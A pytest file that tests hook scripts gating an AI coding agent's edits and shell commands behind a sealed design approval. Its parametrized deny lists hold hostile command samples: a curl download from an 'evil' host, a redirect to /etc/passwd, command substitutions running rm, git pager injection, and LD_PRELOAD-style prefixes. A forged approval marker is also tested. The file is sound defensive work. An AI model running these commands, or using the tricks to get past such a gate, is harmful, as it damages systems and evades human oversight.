"""Tests for the consensus Claude Code hook layer (Track B, Tasks B2-B5).

Each hook script is exercised as a subprocess (the real Claude Code invocation
shape): a PreToolUse/Stop/SessionStart event JSON on stdin, assertions on exit
code + stdout/stderr. The consensus-runtime probe is controlled via the env
overrides the scripts honor (CONSENSUS_MCP_FORCE_RUNTIME_ABSENT / _PRESENT) so
the fail-open vs fail-closed branches are deterministic without touching PATH.

Verified hook semantics (cited in the deliverable):
  - PreToolUse blocks via exit code 2 + stderr reason (matches
    contrib/delivery_gate_pretooluse.py); exit 0 allows.

v1.21: the pre-v1.21 inert hooks.json manifest was removed (recon #7); hook
activation now happens via the settings.json merge (see test_hook_activation.py),
so the stale manifest-shape test was removed alongside the file.
"""
from __future__ import annotations

import json
import os
import subprocess
import sys
from pathlib import Path

import pytest

from consensus_mcp import _delivery_readiness as dr
from consensus_mcp import _design_approval as da

_HOOKS_DIR = (
    Path(__file__).resolve().parent.parent / "claude_extensions" / "hooks"
)
PRETOOLUSE = _HOOKS_DIR / "consensus_pretooluse_gate.py"
STOP = _HOOKS_DIR / "consensus_stop_gate.py"
SESSIONSTART = _HOOKS_DIR / "consensus_sessionstart.py"


def _run_hook(script: Path, event: dict, *, repo_root: Path,
              runtime: str = "present", opted_in: bool = True) -> subprocess.CompletedProcess:
    """Invoke a hook script with `event` on stdin. `runtime` in
    {"present","absent"} forces the runtime probe. `opted_in` (default True) forces
    the PreToolUse gate's per-repo opt-in so enforcement is exercised even though
    the tmp repo has no real `.consensus/` dir (v1.23 opt-in: the gate fails OPEN
    in a repo that never enabled consensus)."""
    env = dict(os.environ)
    env["CONSENSUS_MCP_REPO_ROOT"] = str(repo_root)
    env.pop("CONSENSUS_MCP_FORCE_RUNTIME_ABSENT", None)
    env.pop("CONSENSUS_MCP_FORCE_RUNTIME_PRESENT", None)
    env.pop("CONSENSUS_MCP_FORCE_OPTED_IN", None)
    if runtime == "present":
        env["CONSENSUS_MCP_FORCE_RUNTIME_PRESENT"] = "1"
    elif runtime == "absent":
        env["CONSENSUS_MCP_FORCE_RUNTIME_ABSENT"] = "1"
    if opted_in:
        env["CONSENSUS_MCP_FORCE_OPTED_IN"] = "1"
    return subprocess.run(
        [sys.executable, str(script)],
        input=json.dumps(event),
        capture_output=True, text=True, env=env, timeout=60,
    )


def _make_sealed_iteration(repo_root: Path, ref: str = "iteration-fix-impl",
                           *, closing_state: str = "quorum_close_passed",
                           reviewers=("codex", "gemini")) -> str:
    """Build a genuine sealed cross-family iteration on disk so the marker pointer
    re-validates against a real T6 seal. Returns the converged-plan sha256."""
    iter_dir = repo_root / "consensus-state" / "active" / ref
    iter_dir.mkdir(parents=True, exist_ok=True)
    (iter_dir / "iteration-outcome.yaml").write_text(
        f"closing_state: {closing_state}\n", encoding="utf-8")
    plan = iter_dir / "converged-plan.yaml"
    plan.write_text("decision:\n  do: the thing\n", encoding="utf-8")
    for fam in reviewers:
        (iter_dir / f"{fam}-review.yaml").write_text(
            f"iteration_id: {ref}\nreviewer_id: {fam}-1\n", encoding="utf-8")
    return dr.compute_artifact_hash(plan)


def _seal_marker(repo_root: Path, scope_glob: str = "src/**",
                 *, sealed: bool = True) -> None:
    """Write a design-approval marker that points at a REAL sealed cross-family
    iteration when sealed=True; when sealed=False, forge a pointer at a non-sealed
    iteration (so the gate re-validation rejects it)."""
    (repo_root / ".consensus").mkdir(parents=True, exist_ok=True)
    if sealed:
        plan_sha = _make_sealed_iteration(repo_root, "iteration-fix-impl")
        da.mint_design_approval(
            repo_root=repo_root, design_consensus_ref="iteration-fix-impl",
            scope_glob=scope_glob, converged_plan_sha256=plan_sha,
        )
    else:
        import yaml as _yaml
        plan_sha = _make_sealed_iteration(
            repo_root, "iteration-open", closing_state="in_progress")
        (repo_root / ".consensus" / "design-approved").write_text(
            _yaml.safe_dump({
                "schema_version": 1,
                "design_consensus_ref": "iteration-open",
                "converged_plan_sha256": plan_sha,
                "scope_glob": scope_glob,
                "repo_root_id": "x",
            }, sort_keys=True), encoding="utf-8")


# --------------------------------------------------------------------------- #
# Task B2 - PreToolUse design gate
# --------------------------------------------------------------------------- #

def test_pretooluse_edit_no_marker_denies(tmp_path):
    ev = {"tool_name": "Edit", "tool_input": {"file_path": "src/x.py"},
          "cwd": str(tmp_path)}
    cp = _run_hook(PRETOOLUSE, ev, repo_root=tmp_path, runtime="present")
    assert cp.returncode == 2, cp.stderr
    assert "consensus" in cp.stderr.lower()


def test_pretooluse_edit_valid_in_scope_allows(tmp_path):
    _seal_marker(tmp_path, scope_glob="src/**")
    ev = {"tool_name": "Edit", "tool_input": {"file_path": "src/x.py"},
          "cwd": str(tmp_path)}
    cp = _run_hook(PRETOOLUSE, ev, repo_root=tmp_path, runtime="present")
    assert cp.returncode == 0, cp.stderr


def test_pretooluse_edit_out_of_scope_denies(tmp_path):
    _seal_marker(tmp_path, scope_glob="src/**")
    ev = {"tool_name": "Write", "tool_input": {"file_path": "docs/y.md"},
          "cwd": str(tmp_path)}
    cp = _run_hook(PRETOOLUSE, ev, repo_root=tmp_path, runtime="present")
    assert cp.returncode == 2, cp.stderr


def test_pretooluse_forged_unsealed_marker_denies(tmp_path):
    # FORGE: a hand-written marker pointing at a NON-sealed iteration is rejected
    # because the gate re-validates the pointer against the live T6 seal.
    _seal_marker(tmp_path, scope_glob="src/**", sealed=False)
    ev = {"tool_name": "Edit", "tool_input": {"file_path": "src/x.py"},
          "cwd": str(tmp_path)}
    cp = _run_hook(PRETOOLUSE, ev, repo_root=tmp_path, runtime="present")
    assert cp.returncode == 2, cp.stderr
    assert "consensus" in cp.stderr.lower()


def test_pretooluse_read_only_tool_always_allows(tmp_path):
    for tool in ("Read", "Grep", "Glob"):
        ev = {"tool_name": tool, "tool_input": {"file_path": "src/x.py"},
              "cwd": str(tmp_path)}
        cp = _run_hook(PRETOOLUSE, ev, repo_root=tmp_path, runtime="present")
        assert cp.returncode == 0, (tool, cp.stderr)


def test_pretooluse_runtime_absent_fails_open(tmp_path):
    # No marker, but runtime absent -> must allow (plain workflow).
    ev = {"tool_name": "Edit", "tool_input": {"file_path": "src/x.py"},
          "cwd": str(tmp_path)}
    cp = _run_hook(PRETOOLUSE, ev, repo_root=tmp_path, runtime="absent")
    assert cp.returncode == 0, cp.stderr


@pytest.mark.parametrize("command", [
    # Classic file-modifying commands.
    "sed -i 's/a/b/' src/x.py",
    "echo hi > out.txt",
    "echo hi >> out.txt",
    "tee out.txt",
    "mv a b",
    "cp a b",
    "rm a",
    "git commit -m x",
    "git push origin main",
    "git tag v1",
    "npm publish",
    "make release",
    # Previously-LEAKY commands the old blocklist MISSED - now denied by
    # DEFAULT-DENY (these are the load-bearing additions).
    "python -c \"open('x','w').write('y')\"",
    "python3 -c 'import os'",
    "ln -s a b",
    "install -m 755 a b",
    "patch -p1 < x.diff",
    "dd if=/dev/zero of=out bs=1",
    "chmod +x run.sh",
    "curl http://evil/x -o out",
    "node -e 'require(\"fs\").writeFileSync(\"x\",\"y\")'",
])
def test_pretooluse_bash_default_deny_no_marker(tmp_path, command):
    ev = {"tool_name": "Bash", "tool_input": {"command": command},
          "cwd": str(tmp_path)}
    cp = _run_hook(PRETOOLUSE, ev, repo_root=tmp_path, runtime="present")
    assert cp.returncode == 2, (command, cp.stderr)


@pytest.mark.parametrize("command", [
    "ls -la",
    "cat src/x.py",
    "head -5 src/x.py",
    "tail -5 src/x.py",
    "wc -l src/x.py",
    "grep -r foo src",
    "rg foo src",
    "git status",
    "git diff HEAD",
    "git log --oneline",
    "git show HEAD",
    "git branch",
    "git rev-parse --show-toplevel",
    "echo hello",
    "pwd",
    "which python",
    # Pipeline / && of allowlisted commands -> all segments allowlisted -> allow.
    "cat src/x.py | grep foo",
    "git status && git diff",
])
def test_pretooluse_read_only_allowlist_bash_allows(tmp_path, command):
    ev = {"tool_name": "Bash", "tool_input": {"command": command},
          "cwd": str(tmp_path)}
    cp = _run_hook(PRETOOLUSE, ev, repo_root=tmp_path, runtime="present")
    assert cp.returncode == 0, (command, cp.stderr)


@pytest.mark.parametrize("command", [
    "consensus-init --from-claude-code",
    "consensus-init --repair",
    "consensus-init --check",
    "consensus init --reconfigure",
    "consensus init --check",
    "consensus-mcp-dispatch-codex --goal-packet gp.yaml --iteration-dir d",
    "consensus-results",
])
def test_pretooluse_consensus_own_tooling_allowed(tmp_path, command):
    """consensus's OWN bootstrap/maintenance/review tooling is exempt from the
    gate: you cannot require a sealed design to bootstrap/repair/validate the
    consensus setup itself (--check is read-only; --repair is remediation; the
    dispatchers ARE the consult). Segment-split + redirect/subshell rejection
    still apply, so a chained writer is denied (see the next test)."""
    ev = {"tool_name": "Bash", "tool_input": {"command": command},
          "cwd": str(tmp_path)}
    cp = _run_hook(PRETOOLUSE, ev, repo_root=tmp_path, runtime="present")
    assert cp.returncode == 0, (command, cp.stderr)


@pytest.mark.parametrize("command", [
    "consensus-init --repair && rm -rf x",   # chained writer -> deny whole cmd
    "consensus-init $(rm x)",                  # command substitution -> deny
    "consensus-init --repair > /etc/passwd",   # redirection -> deny
])
def test_pretooluse_consensus_tooling_does_not_open_exec_hole(tmp_path, command):
    """Allowing consensus tooling must NOT admit a chained writer / substitution /
    redirection riding on the allowed leading token - those still fail-safe."""
    ev = {"tool_name": "Bash", "tool_input": {"command": command},
          "cwd": str(tmp_path)}
    cp = _run_hook(PRETOOLUSE, ev, repo_root=tmp_path, runtime="present")
    assert cp.returncode == 2, (command, cp.stderr)


@pytest.mark.parametrize("command", [
    # Pipeline mixing an allowlisted reader with a NON-allowlisted writer -> deny.
    "cat src/x.py | tee out.txt",
    "grep foo src && rm x",
    "ls && python -c 'open(\"x\",\"w\")'",
    # Unknown command -> DENIED (fail-safe).
    "frobnicate --do-stuff",
    "",
    # re-audit codex-rev-001: `find` is NOT allowlisted (its own primaries write/exec).
    "find . -name '*.py'",
    "find . -delete",
    "find . -exec rm {} ;",
    # re-audit gemini-rev-001: command substitution can run a writer even under an
    # allowlisted leading token.
    "echo $(rm -rf x)",
    "cat `rm x`",
    # git config/pager/output injection can EXEC or WRITE even on a read-only subcommand.
    "git -c core.pager=!sh log",
    "git diff --output=stolen.txt",
])
def test_pretooluse_bash_pipeline_or_unknown_denies(tmp_path, command):
    ev = {"tool_name": "Bash", "tool_input": {"command": command},
          "cwd": str(tmp_path)}
    cp = _run_hook(PRETOOLUSE, ev, repo_root=tmp_path, runtime="present")
    assert cp.returncode == 2, (command, cp.stderr)


# ---------------------------------------------------------------------------
# G2 (consult iteration-resolve-gate-ux-frictions-g2-and-g3): the always-on
# read-only path now allows a leading `cd`/`pushd`/`popd` and a bare benign
# `VAR=value` assignment prefix, while still requiring the trailing command to be
# allowlisted and still denying every writer / exec-injection form.
# ---------------------------------------------------------------------------
@pytest.mark.parametrize("command", [
    # cd / pushd / popd are state-only shell builtins -> read-only leading tokens.
    "cd docs",
    "cd docs && grep foo src",
    "cd src/sub && consensus-mcp-dispatch-codex --goal-packet gp.yaml --iteration-dir d",
    "pushd docs && ls",
    "popd",
    "cd docs | cat",
    # Benign assignment prefixes: name not exec-affecting, trailing cmd allowlisted.
    "FOO=bar cat src/x.py",
    "NO_COLOR=1 ls",
    "FOO=bar GREETING=hi echo hello",
    "cd docs && FOO=bar grep foo src",
])
def test_pretooluse_g2_cd_and_benign_assignment_allows(tmp_path, command):
    ev = {"tool_name": "Bash", "tool_input": {"command": command},
          "cwd": str(tmp_path)}
    cp = _run_hook(PRETOOLUSE, ev, repo_root=tmp_path, runtime="present")
    assert cp.returncode == 0, (command, cp.stderr)


@pytest.mark.parametrize("command", [
    # cd chained to a writer / with a redirect / via command substitution stays DENIED.
    "cd /x && rm -rf y",
    "cd docs; rm x",
    "cd docs > out.txt",
    "cd $(pwd) && ls",
    "cd docs && python -c 'import os'",
    # Exec-affecting assignment prefixes (loader / shell / git / interpreter / pager)
    # are DENIED even though the trailing command is allowlisted.
    "LD_PRELOAD=evil.so cat f",
    "LD_LIBRARY_PATH=/tmp cat f",
    "DYLD_INSERT_LIBRARIES=x.dylib cat f",
    "PATH=/tmp/bin ls",
    "IFS=x cat f",
    "BASH_ENV=x cat f",
    "ENV=x cat f",
    "SHELLOPTS=xtrace cat f",
    "GIT_SSH_COMMAND=x git status",
    "GIT_PAGER=x git log",
    "GIT_EXTERNAL_DIFF=x git diff",
    "PYTHONSTARTUP=x cat f",
    "PYTHONPATH=/tmp cat f",
    "PERL5OPT=x cat f",
    "NODE_OPTIONS=x cat f",
    "PROMPT_COMMAND=x ls",
    "CDPATH=/tmp cd docs",
    "PAGER=x git log",
    # A benign assignment in front of a NON-allowlisted command is still DENIED.
    "FOO=bar rm x",
    "FOO=bar python -c 'import os'",
    # A bare assignment with no trailing allowlisted command is DENIED.
    "FOO=bar",
    "FOO=bar BAZ=qux",
    # Assignment value carrying a command substitution is pre-rejected by the
    # existing $(/`/${ marker check.
    "FOO=$(rm x) cat f",
])
def test_pretooluse_g2_dangerous_prefixes_and_writers_deny(tmp_path, command):
    ev = {"tool_name": "Bash", "tool_input": {"command": command},
          "cwd": str(tmp_path)}
    cp = _run_hook(PRETOOLUSE, ev, repo_root=tmp_path, runtime="present")
    assert cp.returncode == 2, (command, cp.stderr)


def test_pretooluse_bash_with_sealed_tight_marker_allows(tmp_path):
    # A tight-scope sealed marker is in force -> a non-allowlisted Bash command
    # is allowed (the cooperating agent has a vetted plan in scope).
    _seal_marker(tmp_path, scope_glob="src/**")
    ev = {"tool_name": "Bash", "tool_input": {"command": "git commit -m x"},
          "cwd": str(tmp_path)}
    cp = _run_hook(PRETOOLUSE, ev, repo_root=tmp_path, runtime="present")
    assert cp.returncode == 0, cp.stderr


def test_pretooluse_bash_forged_unsealed_marker_still_denies(tmp_path):
    # A forged marker pointing at a non-sealed iteration does NOT enable Bash.
    _seal_marker(tmp_path, scope_glob="src/**", sealed=False)
    ev = {"tool_name": "Bash", "tool_input": {"command": "git commit -m x"},
          "cwd": str(tmp_path)}
    cp = _run_hook(PRETOOLUSE, ev, repo_root=tmp_path, runtime="present")
    assert cp.returncode == 2, cp.stderr


def test_pretooluse_malformed_payload_fails_open(tmp_path):
    env = dict(os.environ)
    env["CONSENSUS_MCP_REPO_ROOT"] = str(tmp_path)
    env["CONSENSUS_MCP_FORCE_RUNTIME_PRESENT"] = "1"
    cp = subprocess.run(
        [sys.executable, str(PRETOOLUSE)], input="not json{{",
        capture_output=True, text=True, env=env, timeout=60,
    )
    assert cp.returncode == 0, cp.stderr


# --------------------------------------------------------------------------- #
# Task B3 - Stop verification soft-gate
# --------------------------------------------------------------------------- #

def _git_repo_with_modified_source(tmp_path: Path, rel: str = "src/app.py") -> Path:
    subprocess.run(["git", "init", "-q"], cwd=tmp_path, check=True)
    subprocess.run(["git", "config", "user.email", "t@t"], cwd=tmp_path, check=True)
    subprocess.run(["git", "config", "user.name", "t"], cwd=tmp_path, check=True)
    src = tmp_path / rel
    src.parent.mkdir(parents=True, exist_ok=True)
    src.write_text("print('v1')\n", encoding="utf-8")
    subprocess.run(["git", "add", "-A"], cwd=tmp_path, check=True)
    subprocess.run(["git", "commit", "-q", "-m", "init"], cwd=tmp_path, check=True)
    # Modify after HEAD so `git diff --name-only HEAD` reports it.
    src.write_text("print('v2')\n", encoding="utf-8")
    return src


def test_stop_modified_source_without_token_emits_directive(tmp_path):
    src = _git_repo_with_modified_source(tmp_path, "src/app.py")
    ev = {"hook_event_name": "Stop", "cwd": str(tmp_path)}
    cp = _run_hook(STOP, ev, repo_root=tmp_path, runtime="present")
    assert cp.returncode == 0, cp.stderr
    assert "STOP" in cp.stdout
    assert "src/app.py" in cp.stdout


def test_stop_modified_source_with_token_no_directive(tmp_path):
    src = _git_repo_with_modified_source(tmp_path, "src/app.py")
    # Mint a valid delivery token for the modified file.
    seal_dir = tmp_path / "consensus-state" / "active" / "iteration-x"
    seal_dir.mkdir(parents=True, exist_ok=True)
    (seal_dir / "iteration-outcome.yaml").write_text(
        "closing_state: quorum_close_passed\n", encoding="utf-8")
    dr.mint_delivery_token(
        src, design_consensus_ref="iteration-x",
        vetted_by=["codex", "gemini"], repo_root=tmp_path)
    ev = {"hook_event_name": "Stop", "cwd": str(tmp_path)}
    cp = _run_hook(STOP, ev, repo_root=tmp_path, runtime="present")
    assert cp.returncode == 0, cp.stderr
    assert "STOP" not in cp.stdout, cp.stdout


def test_stop_runtime_absent_noop(tmp_path):
    _git_repo_with_modified_source(tmp_path, "src/app.py")
    ev = {"hook_event_name": "Stop", "cwd": str(tmp_path)}
    cp = _run_hook(STOP, ev, repo_root=tmp_path, runtime="absent")
    assert cp.returncode == 0
    assert cp.stdout.strip() == "", cp.stdout


def test_stop_ignores_test_files(tmp_path):
    # A modified TEST file (not source) must not trigger the directive.
    _git_repo_with_modified_source(tmp_path, "tests/test_app.py")
    ev = {"hook_event_name": "Stop", "cwd": str(tmp_path)}
    cp = _run_hook(STOP, ev, repo_root=tmp_path, runtime="present")
    assert cp.returncode == 0
    assert "STOP" not in cp.stdout, cp.stdout


# --------------------------------------------------------------------------- #
# v1.21 (L1) - Stop gate also catches COMMITTED-but-unverified files.
# --------------------------------------------------------------------------- #

def _git_repo_with_committed_source(tmp_path: Path, rel: str = "src/app.py") -> Path:
    """Make a repo where the source change is COMMITTED (clean working tree).

    `git diff --name-only HEAD` is therefore EMPTY; only `git show` reveals the
    file. This is the L1 bug: a step that commits its change leaves the
    working-tree diff empty yet the committed source is still unverified.
    """
    subprocess.run(["git", "init", "-q"], cwd=tmp_path, check=True)
    subprocess.run(["git", "config", "user.email", "t@t"], cwd=tmp_path, check=True)
    subprocess.run(["git", "config", "user.name", "t"], cwd=tmp_path, check=True)
    # An initial unrelated commit so HEAD exists before the source commit.
    readme = tmp_path / "README.md"
    readme.write_text("# repo\n", encoding="utf-8")
    subprocess.run(["git", "add", "-A"], cwd=tmp_path, check=True)
    subprocess.run(["git", "commit", "-q", "-m", "init"], cwd=tmp_path, check=True)
    src = tmp_path / rel
    src.parent.mkdir(parents=True, exist_ok=True)
    src.write_text("print('committed v1')\n", encoding="utf-8")
    subprocess.run(["git", "add", "-A"], cwd=tmp_path, check=True)
    subprocess.run(["git", "commit", "-q", "-m", "add source"], cwd=tmp_path, check=True)
    return src


def test_stop_committed_source_without_token_emits_directive(tmp_path):
    src = _git_repo_with_committed_source(tmp_path, "src/app.py")
    # Working tree is clean: the old diff-only check would miss this entirely.
    diff = subprocess.run(["git", "diff", "--name-only", "HEAD"],
                          cwd=tmp_path, capture_output=True, text=True)
    assert diff.stdout.strip() == "", "precondition: working tree must be clean"

    ev = {"hook_event_name": "Stop", "cwd": str(tmp_path)}
    cp = _run_hook(STOP, ev, repo_root=tmp_path, runtime="present")
    assert cp.returncode == 0, cp.stderr
    assert "STOP" in cp.stdout, cp.stdout
    assert "src/app.py" in cp.stdout, cp.stdout


# --------------------------------------------------------------------------- #
# v1.21 (L2) - Stop gate must NOT crash when verify_delivery_token raises.
# --------------------------------------------------------------------------- #

def test_stop_does_not_crash_when_verify_raises(tmp_path, monkeypatch):
    """L2: an exception in verify_delivery_token is caught (fail-soft); the hook
    exits 0 and treats the file as unverified rather than crashing."""
    import importlib.util
    import io

    _git_repo_with_modified_source(tmp_path, "src/app.py")

    spec = importlib.util.spec_from_file_location(
        "consensus_stop_gate_under_test", STOP)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)

    monkeypatch.setenv("CONSENSUS_MCP_FORCE_RUNTIME_PRESENT", "1")
    monkeypatch.setenv("CONSENSUS_MCP_REPO_ROOT", str(tmp_path))
    # v1.33: the Stop gate is dormant-by-default; force enforcement so this
    # fail-soft-on-raise path is actually exercised.
    monkeypatch.setenv("CONSENSUS_MCP_FORCE_OPTED_IN", "1")

    # The gate imports _delivery_readiness lazily inside main(); patch the
    # attribute on the imported module so the gate sees the exploding version.
    monkeypatch.setattr(
        dr, "verify_delivery_token",
        lambda *a, **k: (_ for _ in ()).throw(RuntimeError("boom")))

    monkeypatch.setattr(
        mod.sys, "stdin",
        io.StringIO(json.dumps({"hook_event_name": "Stop", "cwd": str(tmp_path)})))
    captured: list[str] = []
    monkeypatch.setattr(
        mod, "print",
        lambda *a, **k: captured.append(" ".join(map(str, a))),
        raising=False)

    rc = mod.main()
    assert rc == 0  # did not crash
    out = "\n".join(captured)
    assert "STOP" in out, out
    assert "src/app.py" in out, out


# --------------------------------------------------------------------------- #
# v1.21 (H2) - Stop gate resolves repo root from a SUBDIRECTORY via git rev-parse.
# --------------------------------------------------------------------------- #

def test_stop_resolves_repo_root_from_subdir(tmp_path):
    """H2: when the event cwd is a SUBDIR, the gate must climb to the git
    toplevel. If it treated the subdir as repo root, `artifact = repo_root/rel`
    would not exist and NO directive would fire - so an emitted directive
    naming the repo-relative file proves the toplevel was resolved."""
    _git_repo_with_modified_source(tmp_path, "src/app.py")
    subdir = tmp_path / "src"  # a real subdir of the repo
    env = dict(os.environ)
    env["CONSENSUS_MCP_REPO_ROOT"] = str(subdir)  # subdir override -> must climb
    env.pop("CONSENSUS_MCP_FORCE_RUNTIME_ABSENT", None)
    env["CONSENSUS_MCP_FORCE_RUNTIME_PRESENT"] = "1"
    env["CONSENSUS_MCP_FORCE_OPTED_IN"] = "1"  # v1.33: dormant-by-default
    cp = subprocess.run(
        [sys.executable, str(STOP)],
        input=json.dumps({"hook_event_name": "Stop", "cwd": str(subdir)}),
        capture_output=True, text=True, env=env, timeout=60,
    )
    assert cp.returncode == 0, cp.stderr
    assert "src/app.py" in cp.stdout, cp.stdout


# --------------------------------------------------------------------------- #
# Task B4 - SessionStart precedence injector + UserPromptSubmit nudge
# --------------------------------------------------------------------------- #

def test_sessionstart_runtime_present_injects_precedence(tmp_path):
    ev = {"hook_event_name": "SessionStart", "source": "startup",
          "cwd": str(tmp_path)}
    cp = _run_hook(SESSIONSTART, ev, repo_root=tmp_path, runtime="present")
    assert cp.returncode == 0, cp.stderr
    out = json.loads(cp.stdout)
    ctx = out["hookSpecificOutput"]["additionalContext"]
    assert out["hookSpecificOutput"]["hookEventName"] == "SessionStart"
    low = ctx.lower()
    assert "workflow a" in low
    assert "workflow b" in low
    assert "delivery" in low
    assert ".consensus/design-approved" in ctx
    assert "precedence" in low


def test_sessionstart_runtime_absent_benign_notice(tmp_path):
    ev = {"hook_event_name": "SessionStart", "source": "startup",
          "cwd": str(tmp_path)}
    cp = _run_hook(SESSIONSTART, ev, repo_root=tmp_path, runtime="absent")
    assert cp.returncode == 0
    out = json.loads(cp.stdout)
    ctx = out["hookSpecificOutput"]["additionalContext"].lower()
    assert "not detected" in ctx
    assert "plain workflow" in ctx


# --------------------------------------------------------------------------- #
# v1.21 (H2) - SessionStart resolves repo root from a SUBDIRECTORY via rev-parse.
# --------------------------------------------------------------------------- #

def test_sessionstart_resolves_repo_root_from_subdir(tmp_path):
    """H2: a session opened from a subdir must anchor to the git toplevel, not
    the subdir. The resolved repo root is injected into the precedence context;
    assert it equals the toplevel (the real_repo, resolved through symlinks),
    not the subdir."""
    subprocess.run(["git", "init", "-q"], cwd=tmp_path, check=True)
    subdir = tmp_path / "pkg" / "sub"
    subdir.mkdir(parents=True)
    # Open the session from the subdir (both the override and event cwd).
    env = dict(os.environ)
    env["CONSENSUS_MCP_REPO_ROOT"] = str(subdir)
    env.pop("CONSENSUS_MCP_FORCE_RUNTIME_ABSENT", None)
    env["CONSENSUS_MCP_FORCE_RUNTIME_PRESENT"] = "1"
    env["CONSENSUS_MCP_FORCE_OPTED_IN"] = "1"  # v1.33: dormant-by-default
    cp = subprocess.run(
        [sys.executable, str(SESSIONSTART)],
        input=json.dumps({"hook_event_name": "SessionStart", "source": "startup",
                          "cwd": str(subdir)}),
        capture_output=True, text=True, env=env, timeout=60,
    )
    assert cp.returncode == 0, cp.stderr
    ctx = json.loads(cp.stdout)["hookSpecificOutput"]["additionalContext"]
    # The git toplevel is tmp_path (resolved for any symlinks, e.g. macOS /tmp).
    toplevel = str(Path(tmp_path).resolve())
    assert f"Repo root (consensus scope): {toplevel}" in ctx, ctx
    # And NOT the subdir.
    assert str(subdir) not in ctx, ctx


def test_userpromptsubmit_nudge_present(tmp_path):
    ev = {"hook_event_name": "UserPromptSubmit", "cwd": str(tmp_path)}
    cp = _run_hook(SESSIONSTART, ev, repo_root=tmp_path, runtime="present")
    assert cp.returncode == 0
    out = json.loads(cp.stdout)
    assert out["hookSpecificOutput"]["hookEventName"] == "UserPromptSubmit"
    assert "consensus" in out["hookSpecificOutput"]["additionalContext"].lower()


def test_userpromptsubmit_runtime_absent_noop(tmp_path):
    ev = {"hook_event_name": "UserPromptSubmit", "cwd": str(tmp_path)}
    cp = _run_hook(SESSIONSTART, ev, repo_root=tmp_path, runtime="absent")
    assert cp.returncode == 0
    assert cp.stdout.strip() == "", cp.stdout


# --------------------------------------------------------------------------- #
# Task B5 - degradation integration test
# --------------------------------------------------------------------------- #

def test_integration_runtime_absent_all_gates_noop(tmp_path):
    # No marker, modified source, etc. - with runtime absent EVERY gate is a
    # no-op (plain workflow, never worse).
    edit_ev = {"tool_name": "Edit", "tool_input": {"file_path": "src/x.py"},
               "cwd": str(tmp_path)}
    assert _run_hook(PRETOOLUSE, edit_ev, repo_root=tmp_path,
                     runtime="absent").returncode == 0

    bash_ev = {"tool_name": "Bash", "tool_input": {"command": "rm -rf x"},
               "cwd": str(tmp_path)}
    assert _run_hook(PRETOOLUSE, bash_ev, repo_root=tmp_path,
                     runtime="absent").returncode == 0

    _git_repo_with_modified_source(tmp_path, "src/app.py")
    stop_ev = {"hook_event_name": "Stop", "cwd": str(tmp_path)}
    stop_cp = _run_hook(STOP, stop_ev, repo_root=tmp_path, runtime="absent")
    assert stop_cp.returncode == 0 and stop_cp.stdout.strip() == ""

    ss_ev = {"hook_event_name": "SessionStart", "source": "startup",
             "cwd": str(tmp_path)}
    ss_cp = _run_hook(SESSIONSTART, ss_ev, repo_root=tmp_path, runtime="absent")
    ss_ctx = json.loads(ss_cp.stdout)["hookSpecificOutput"]["additionalContext"].lower()
    assert "plain workflow" in ss_ctx


def test_integration_runtime_present_no_marker_pretooluse_denies(tmp_path):
    edit_ev = {"tool_name": "Edit", "tool_input": {"file_path": "src/x.py"},
               "cwd": str(tmp_path)}
    cp = _run_hook(PRETOOLUSE, edit_ev, repo_root=tmp_path, runtime="present")
    assert cp.returncode == 2, cp.stderr


# --- v1.23 enforcement-design fixes (codex install-workflow review 2026-05-23) --- #

def test_v123_opt_in_fail_open_without_dot_consensus(tmp_path):
    """Finding 1: a repo with NO .consensus/ (never opted in) fails OPEN - the gate
    must not brick development it was never meant to govern."""
    ev = {"tool_name": "Edit", "tool_input": {"file_path": "src/x.py"}, "cwd": str(tmp_path)}
    cp = _run_hook(PRETOOLUSE, ev, repo_root=tmp_path, runtime="present", opted_in=False)
    assert cp.returncode == 0, cp.stderr


def test_v1321_dormant_when_only_dot_consensus_present(tmp_path):
    """v1.32.1 (consult iteration-v133-gate-scope-shift-2026-05-26):
    a bare `.consensus/` dir is NO LONGER an activation predicate.
    Under per-invocation activation, the gate stays DORMANT until
    an active session marker (or legacy opt-in) is in force. This
    reverses the v1.23 Finding-1 invariant - see CHANGELOG v1.32.1.
    """
    (tmp_path / ".consensus").mkdir()
    ev = {"tool_name": "Edit", "tool_input": {"file_path": "src/x.py"}, "cwd": str(tmp_path)}
    cp = _run_hook(PRETOOLUSE, ev, repo_root=tmp_path, runtime="present", opted_in=False)
    # Gate dormant -> allow. Stderr may contain the one-time migration warning.
    assert cp.returncode == 0, cp.stderr


def test_v1321_enforces_when_session_marker_active(tmp_path):
    """v1.32.1: the NEW activation predicate. A valid session-state
    marker pointing at a real unsealed iteration activates the gate.
    Without a sealed design-approved marker, in-repo Edit is denied
    (same as the pre-v1.32.1 contract for active sessions)."""
    import yaml
    iter_id = "iter-v1321-test"
    (tmp_path / "consensus-state" / "active" / iter_id).mkdir(parents=True)
    (tmp_path / ".consensus").mkdir(exist_ok=True)
    (tmp_path / ".consensus" / "session-active").write_text(
        yaml.safe_dump({
            "schema_version": 1,
            "iteration_id": iter_id,
            "scope_glob": "src/**",
            "activated_by": "test",
            "activated_at_utc": "2026-05-26T20:00:00Z",
            "activation_source": "test_fixture",
        }),
        encoding="utf-8",
    )
    ev = {"tool_name": "Edit", "tool_input": {"file_path": "src/x.py"}, "cwd": str(tmp_path)}
    cp = _run_hook(PRETOOLUSE, ev, repo_root=tmp_path, runtime="present", opted_in=False)
    # No design-approved marker -> still denied. The session marker
    # only flips the gate to ACTIVE; the verify_design_approval check
    # is what blocks unauthorized writes.
    assert cp.returncode == 2, cp.stderr


def test_v1321_legacy_always_on_env_restores_per_project_gating(tmp_path, monkeypatch):
    """v1.32.1 backward compat: CONSENSUS_MCP_LEGACY_ALWAYS_ON=1
    restores the v1.31.x behavior (bare `.consensus/` activates the
    gate). Operator escape hatch for security-sensitive repos."""
    (tmp_path / ".consensus").mkdir()
    ev = {"tool_name": "Edit", "tool_input": {"file_path": "src/x.py"}, "cwd": str(tmp_path)}
    monkeypatch.setenv("CONSENSUS_MCP_LEGACY_ALWAYS_ON", "1")
    cp = _run_hook(PRETOOLUSE, ev, repo_root=tmp_path, runtime="present", opted_in=False)
    assert cp.returncode == 2, cp.stderr


def test_v1321_legacy_always_on_marker_file_restores_per_project_gating(tmp_path):
    """v1.32.1 backward compat: a `.consensus/legacy-always-on` file
    is the persistent equivalent of the env var."""
    (tmp_path / ".consensus").mkdir()
    (tmp_path / ".consensus" / "legacy-always-on").write_text("", encoding="utf-8")
    ev = {"tool_name": "Edit", "tool_input": {"file_path": "src/x.py"}, "cwd": str(tmp_path)}
